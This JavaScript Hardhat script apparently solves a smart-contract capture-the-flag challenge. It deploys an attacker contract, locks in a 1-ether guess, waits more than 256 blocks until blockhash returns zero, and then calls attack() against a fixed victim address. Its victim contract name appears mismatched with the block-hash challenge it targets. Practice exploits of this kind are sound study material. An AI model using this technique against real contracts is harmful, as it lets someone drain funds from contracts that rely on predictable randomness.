require("@nomiclabs/hardhat-ethers");
const { ethers } = require("hardhat");

/*
To be used for just call the attack method
*/
async function main() {
    
  const victimaAddress = "0xe470094e186B105888e4a09aEccABa073ae1b3f7"
  const Victima = await ethers.getContractFactory("PredictTheFutureChallenge");
  const victimaSC = Victima.attach(victimaAddress);
  const Atacante = await ethers.getContractFactory("PredictTheBlockHashAttacker");
  const atacanteSC = await Atacante.deploy(victimaSC.address);

  await atacanteSC.isDeployed;
  console.log("atacante SC deployed")
  
  const tx = await atacanteSC.lockInGuess(
    {value: ethers.utils.parseEther('1')}
    );
  await tx.wait(1);
  console.log("lock in guess done!")

  
  // wait until the block delay it's fine
  const settlementBlockNumber = await atacanteSC.settlementBlockNumber()
  console.log("Settlement BlockNumber", settlementBlockNumber.toString())
  const desiredBlock = settlementBlockNumber.add(BigInt(257));
  await new Promise((resolve, reject) => {
      ethers.provider.on("block", (blockNumber) => {
        if (blockNumber > desiredBlock) {
          resolve();
        } else {
            console.log("waiting, current distance to block it's ", 
                        blockNumber - settlementBlockNumber,
                        " < 256. Desired block its: ", desiredBlock.toString(),
                        "Current block: ", blockNumber);
        }
      })
  });

  console.log("Trying to attack")
    try {
      var attackTx = await atacanteSC.attack(
          {
              gasPrice: ethers.utils.parseUnits('15','gwei'),
              gasLimit: 500000,
          }
      );

      // the try catch is to handle the revert in the attacker contract
      // wait for the tx to be minned
      var receipt = await attackTx.wait(10);
      
    } catch {
        console.log("Attack wasn't succesfull")
        guess = await atacanteSC.guess();
        console.log("Guess answer: ", guess);
        var bn = await ethers.provider.blockNumber;
        console.log("Block number: ", bn);
    }
    
  succesfull = await victimaSC.isComplete();
  console.log("Attack succesfull?", succesfull)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });

    